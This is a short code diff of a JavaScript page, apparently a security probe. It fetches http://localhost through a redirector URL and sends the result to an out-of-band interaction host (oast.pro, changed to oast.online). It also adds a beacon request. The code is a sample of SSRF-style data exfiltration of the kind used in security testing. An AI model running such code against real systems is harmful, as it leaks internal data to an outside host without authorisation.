@@ -15,7 +15,7 @@
 
       async function getData() {
     const url = "https://307.r3dir.me/--to/?url=http://localhost";
-    const oast = "https://d9srurqmruokbm3mdu3gxuxf3t9tuwyw5.oast.pro/";
+    const oast = "https://d9stcb2mruohpdmpjia0foc4nep6tzahw.oast.online/";
 
     try {
         const response = await fetch(url);
@@ -28,7 +28,7 @@
 
         document.getElementById("result").textContent =
             JSON.stringify(result, null, 2);
-
+        await fetch(oast+`?q=done`)
         await fetch(oast, {
             method: "POST",
             headers: {
